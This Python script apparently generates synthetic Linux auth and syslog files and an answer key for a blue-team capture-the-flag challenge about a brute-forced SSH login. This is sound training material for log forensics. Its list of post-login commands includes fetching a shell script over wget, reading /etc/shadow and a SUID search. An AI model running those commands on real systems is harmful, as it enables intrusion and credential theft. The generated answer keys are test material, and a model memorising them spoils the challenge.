#!/usr/bin/env python3
"""
DIRECTIVE ZERO — BT-01 "The Unauthorized Login" artifact generator.

Generates a synthetic Linux auth.log + syslog that tell the story of a
brute-force SSH attack followed by a successful login and post-login
command execution. The artifact is randomized per run so answers don't
spread between events.

Output files (in --out-dir, default ./artifacts):
  - bt01_auth.log   — Debian auth.log (~500 lines)
  - bt01_syslog     — Debian syslog (~200 lines)
  - answers.json    — answer key in DZ{...} format

The answers are also merged into the event_flags.json file (if
--flags-file is specified) so import_challenges.py can load them.

Usage:
  python3 generate.py                          # random seed
  python3 generate.py --seed 42                # reproducible
  python3 generate.py --out-dir ./artifacts    # custom output dir
  python3 generate.py --flags-file ../../Anomaly_Machines/event_flags.json
"""

import argparse
import json
import os
import random
import sys
from datetime import datetime, timedelta

# ── Pools for randomization ────────────────────────────────────────────────

QUORUM_USERS = ["compliance", "operator", "archivist", "researcher", "analyst"]
ATTACK_USERNAMES = ["root", "admin", "test", "guest", "www-data", "user",
                    "ubuntu", "postgres", "mysql", "ftp", "oracle", "git",
                    "jenkins", "nginx", "redis", "su", "bin", "daemon"]
FIRST_COMMANDS = ["id", "whoami", "cat /etc/passwd", "ls -la /root",
                  "uname -a", "wget http://10.10.9.1/shell.sh",
                  "cat /etc/shadow", "ps aux", "netstat -tulpn",
                  "find / -perm -4000 -type f 2>/dev/null"]
LEGIT_IPS_POOL = ["10.10.3.11", "10.10.3.12", "10.10.3.15", "10.10.3.20",
                  "10.10.5.7", "10.10.5.18", "10.10.7.3", "10.10.7.9"]
HOSTNAME = "lobby-terminal"

# ── Log line generators ────────────────────────────────────────────────────

def fmt_ts(dt):
    """Format a datetime as syslog timestamp: 'Aug 22 02:03:17'"""
    return dt.strftime("%b %e %H:%M:%S").replace("  ", " ")

def gen_pid(rng):
    return rng.randint(1000, 9999)

def gen_port(rng):
    return rng.randint(49152, 65535)

def sshd_failed_login(ts, pid, port, username, ip, invalid=False):
    """Generate a failed SSH login line."""
    if invalid:
        return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: Failed password for invalid user {username} from {ip} port {port} ssh2"
    else:
        return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: Failed password for {username} from {ip} port {port} ssh2"

def sshd_accepted_login(ts, pid, port, username, ip):
    """Generate a successful SSH login line."""
    return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: Accepted password for {username} from {ip} port {port} ssh2"

def sshd_session_opened(ts, pid, username):
    """Generate a PAM session opened line."""
    return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: pam_unix(sshd:session): session opened for user {username} by (uid=0)"

def sshd_session_closed(ts, pid, username):
    return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: pam_unix(sshd:session): session closed for user {username}"

def sshd_disconnect(ts, pid):
    return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: Connection closed by 10.10.3.11 port 49152 [preauth]"

def sshd_connection_from(ts, pid, ip, port):
    return f"{fmt_ts(ts)} {HOSTNAME} sshd[{pid}]: Connection from {ip} port {port}"

def cron_line(ts, user, cmd):
    return f"{fmt_ts(ts)} {HOSTNAME} CRON[{gen_pid(random)}]: (root) CMD ({cmd})"

def sudo_command(ts, user, command, cwd="/home"):
    """Generate a sudo command log line (for syslog)."""
    return (f"{fmt_ts(ts)} {HOSTNAME} sudo:  {user} : "
            f"TTY=pts/0 ; PWD={cwd} ; USER=root ; COMMAND={command}")

def systemd_line(ts, service, msg):
    return f"{fmt_ts(ts)} {HOSTNAME} systemd[1]: {msg}"

def cron_session(ts, pid, user):
    return f"{fmt_ts(ts)} {HOSTNAME} CRON[{pid}]: pam_unix(cron:session): session opened for user {user} by (uid=0)"

def cron_session_close(ts, pid, user):
    return f"{fmt_ts(ts)} {HOSTNAME} CRON[{pid}]: pam_unix(cron:session): session closed for user {user}"

# ── Cover traffic generators ───────────────────────────────────────────────

def gen_cover_auth_log(rng, start_time, count=300, exclude_user=None):
    """Generate cover traffic for auth.log — legitimate system events."""
    exclude = exclude_user or ""
    lines = []
    t = start_time
    pid = 1000
    for _ in range(count):
        r = rng.random()
        if r < 0.30:
            # Cron session
            user = rng.choice(["root", "www-data"])
            pid_val = gen_pid(rng)
            lines.append(cron_session(t, pid_val, user))
            t += timedelta(seconds=rng.randint(1, 30))
            lines.append(cron_session_close(t, pid_val, user))
        elif r < 0.45:
            # Legitimate SSH login from a known IP
            ip = rng.choice(LEGIT_IPS_POOL)
            port = gen_port(rng)
            user = rng.choice(QUORUM_USERS)
            lines.append(sshd_connection_from(t, pid, ip, port))
            t += timedelta(seconds=rng.randint(1, 5))
            lines.append(sshd_accepted_login(t, pid, port, user, ip))
            t += timedelta(seconds=rng.randint(1, 10))
            lines.append(sshd_session_opened(t, pid, user))
            t += timedelta(seconds=rng.randint(60, 600))
            lines.append(sshd_session_closed(t, pid, user))
        elif r < 0.55:
            # Failed login from a legit IP (typos, etc.)
            ip = rng.choice(LEGIT_IPS_POOL)
            port = gen_port(rng)
            user = rng.choice(QUORUM_USERS)
            lines.append(sshd_failed_login(t, pid, port, user, ip))
            t += timedelta(seconds=rng.randint(1, 30))
        elif r < 0.65:
            # Invalid user attempt from a legit IP (scanner noise)
            ip = rng.choice(LEGIT_IPS_POOL)
            port = gen_port(rng)
            user = rng.choice(ATTACK_USERNAMES)
            lines.append(sshd_failed_login(t, pid, port, user, ip, invalid=True))
            t += timedelta(seconds=rng.randint(1, 20))
        elif r < 0.75:
            # sudo entry — exclude the target user (their sudo entries
            # are part of the attack sequence, not cover traffic)
            users = [u for u in QUORUM_USERS if u != exclude]
            user = rng.choice(users)
            cmd = rng.choice(["/usr/bin/apt update", "/bin/systemctl restart ssh",
                              "/usr/bin/tail -f /var/log/auth.log",
                              "/bin/journalctl -u sshd"])
            lines.append(f"{fmt_ts(t)} {HOSTNAME} sudo:  {user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")
            t += timedelta(seconds=rng.randint(1, 60))
        else:
            # System event
            msg = rng.choice([
                "Starting Daily apt download activities...",
                "Finished Daily apt download activities.",
                "Starting Cleanup of Temporary Directories...",
                "message repeated 3 times: [ Session started for user root. ]",
                "pam_unix(sudo:session): session opened for user root by (uid=0)",
                "pam_unix(sudo:session): session closed for user root",
            ])
            lines.append(f"{fmt_ts(t)} {HOSTNAME} {msg}")
            t += timedelta(seconds=rng.randint(1, 45))
        pid += 1
    return lines

def gen_cover_syslog(rng, start_time, count=150, exclude_user=None):
    """Generate cover traffic for syslog."""
    exclude = exclude_user or ""
    lines = []
    t = start_time
    for _ in range(count):
        r = rng.random()
        if r < 0.25:
            lines.append(cron_line(t, "root", rng.choice([
                "/usr/local/bin/routing_updater.sh",
                "/usr/lib/php/sessionclean",
                "/usr/sbin/logrotate /etc/logrotate.conf",
                "/etc/cron.daily/apt-compat",
            ])))
        elif r < 0.40:
            lines.append(systemd_line(t, "ssh", rng.choice([
                "Starting OpenBSD Secure Shell server...",
                "Stopped OpenBSD Secure Shell server.",
            ])))
        elif r < 0.55:
            lines.append(systemd_line(t, "cron", rng.choice([
                "Started Regular background program processing daemon.",
                "Reading cron configuration files...",
            ])))
        elif r < 0.70:
            # Legitimate sudo from a known user (exclude target user)
            users = [u for u in QUORUM_USERS if u != exclude]
            user = rng.choice(users)
            cmd = rng.choice(["/usr/bin/apt update", "/bin/systemctl status ssh",
                              "/usr/bin/journalctl --since today"])
            lines.append(sudo_command(t, user, cmd))
        else:
            msg = rng.choice([
                'rsyslogd: imuxsock lost 1 messages',
                'systemd[1]: Cleaned up systemd journal entries.',
                'dhclient[800]: DHCPREQUEST on eth0 to 10.10.0.1 port 67',
                'dhclient[800]: DHCPACK from 10.10.0.1',
            ])
            lines.append(f"{fmt_ts(t)} {HOSTNAME} {msg}")
        t += timedelta(seconds=rng.randint(1, 90))
    return lines

# ── Attack sequence generator ──────────────────────────────────────────────

def gen_attack_auth_log(rng, start_time, attacker_ip, target_user, fail_count, port):
    """Generate the attack sequence for auth.log."""
    lines = []
    t = start_time
    pid = rng.randint(2000, 2999)

    # Connection from attacker
    lines.append(sshd_connection_from(t, pid, attacker_ip, port))
    t += timedelta(seconds=rng.randint(1, 3))

    # Failed login attempts — interspersed with realistic timing
    for i in range(fail_count):
        username = rng.choice(ATTACK_USERNAMES)
        invalid = rng.random() < 0.6  # 60% are invalid users
        lines.append(sshd_failed_login(t, pid, port, username, attacker_ip, invalid))
        t += timedelta(seconds=rng.randint(2, 15))
        pid += 1

    # Successful login
    lines.append(sshd_accepted_login(t, pid, port, target_user, attacker_ip))
    t += timedelta(seconds=1)
    lines.append(sshd_session_opened(t, pid, target_user))

    return lines, t, pid

def gen_attack_syslog(rng, login_time, target_user, first_command):
    """Generate the post-login syslog entries."""
    lines = []
    t = login_time + timedelta(seconds=1)

    # The first command run after login (via sudo)
    full_cmd = f"/usr/bin/{first_command}" if "/" not in first_command else first_command
    lines.append(sudo_command(t, target_user, full_cmd, f"/home/{target_user}"))
    t += timedelta(seconds=rng.randint(5, 30))

    # A few more commands (cover for the first command)
    for cmd in rng.sample(["/usr/bin/whoami", "/bin/ls -la", "/usr/bin/cat /etc/hostname",
                           "/usr/bin/uptime", "/bin/pwd"], 2):
        lines.append(sudo_command(t, target_user, cmd, f"/home/{target_user}"))
        t += timedelta(seconds=rng.randint(5, 20))

    return lines

# ── Main ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="BT-01 artifact generator")
    parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")
    parser.add_argument("--out-dir", default="./artifacts", help="Output directory")
    parser.add_argument("--flags-file", default=None,
                        help="Path to event_flags.json to merge answers into")
    args = parser.parse_args()

    rng = random.Random(args.seed)

    # Randomize the key parameters
    attacker_ip = f"10.10.{rng.randint(4, 8)}.{rng.randint(2, 254)}"
    target_user = rng.choice(QUORUM_USERS)
    fail_count = rng.randint(15, 40)
    first_command = rng.choice(FIRST_COMMANDS)
    port = gen_port(rng)

    # Event date: random day in the last 30 days
    base_date = datetime(2026, 8, 1) + timedelta(days=rng.randint(0, 30))
    start_time = base_date.replace(hour=rng.randint(0, 23), minute=rng.randint(0, 59),
                                   second=rng.randint(0, 59), microsecond=0)

    # Attack starts ~2 hours into the log
    attack_start = start_time + timedelta(hours=rng.randint(1, 4))

    # Generate cover traffic
    cover_auth = gen_cover_auth_log(rng, start_time, count=300, exclude_user=target_user)
    cover_syslog = gen_cover_syslog(rng, start_time, count=150, exclude_user=target_user)

    # Generate attack sequence
    attack_auth, attack_end_time, attack_pid = gen_attack_auth_log(
        rng, attack_start, attacker_ip, target_user, fail_count, port
    )
    attack_syslog = gen_attack_syslog(rng, attack_end_time, target_user, first_command)

    # Merge: cover traffic + attack (attack inserted at the right timestamp position)
    # For simplicity, append the attack after the cover (timestamps are sequential)
    auth_lines = cover_auth + attack_auth
    syslog_lines = cover_syslog + attack_syslog

    # Sort by timestamp (since attack is inserted after cover, and cover has
    # timestamps spanning the full range, we need to interleave properly).
    # Simple approach: sort all lines by their timestamp prefix.
    auth_lines.sort(key=lambda line: line[:15] if len(line) > 15 else line)
    syslog_lines.sort(key=lambda line: line[:15] if len(line) > 15 else line)

    # Write artifacts
    os.makedirs(args.out_dir, exist_ok=True)
    auth_path = os.path.join(args.out_dir, "bt01_auth.log")
    syslog_path = os.path.join(args.out_dir, "bt01_syslog")

    with open(auth_path, "w") as f:
        f.write("\n".join(auth_lines) + "\n")
    with open(syslog_path, "w") as f:
        f.write("\n".join(syslog_lines) + "\n")

    # Build the answer key
    # The challenge names must match what import_challenges.py builds:
    #   f"{q['qid']}: {q['question']}"
    # From CHALLENGE_STRUCTURE.md:
    #   BT-01a: What IP address successfully authenticated?
    #   BT-01b: What username was used to gain access?
    #   BT-01c: How many failed attempts preceded the successful login?
    #   BT-01d: What was the first command run after login?
    answers = {
        "BT-01a: What IP address successfully authenticated after the brute-force attempts?": f"DZ{{{attacker_ip}}}",
        "BT-01b: What username was used to gain access?": f"DZ{{{target_user}}}",
        "BT-01c: How many failed attempts preceded the successful login?": f"DZ{{{fail_count}}}",
        "BT-01d: What was the first command run after login?": f"DZ{{{first_command}}}",
    }

    # Write answers.json
    answers_path = os.path.join(os.path.dirname(args.out_dir), "answers.json")
    with open(answers_path, "w") as f:
        json.dump(answers, f, indent=2)
    print(f"[generate] answers written to {answers_path}")

    # Merge into event_flags.json if specified
    if args.flags_file and os.path.exists(args.flags_file):
        with open(args.flags_file, "r") as f:
            flags = json.load(f)
        flags.update(answers)
        with open(args.flags_file, "w") as f:
            json.dump(flags, f, indent=2)
        print(f"[generate] answers merged into {args.flags_file}")

    # Print summary
    print(f"[generate] BT-01 artifacts generated:")
    print(f"  attacker_ip:    {attacker_ip}")
    print(f"  target_user:    {target_user}")
    print(f"  fail_count:     {fail_count}")
    print(f"  first_command:  {first_command}")
    print(f"  auth.log:       {auth_path} ({len(auth_lines)} lines)")
    print(f"  syslog:         {syslog_path} ({len(syslog_lines)} lines)")
    print(f"  answers:       {answers_path}")

if __name__ == "__main__":
    main()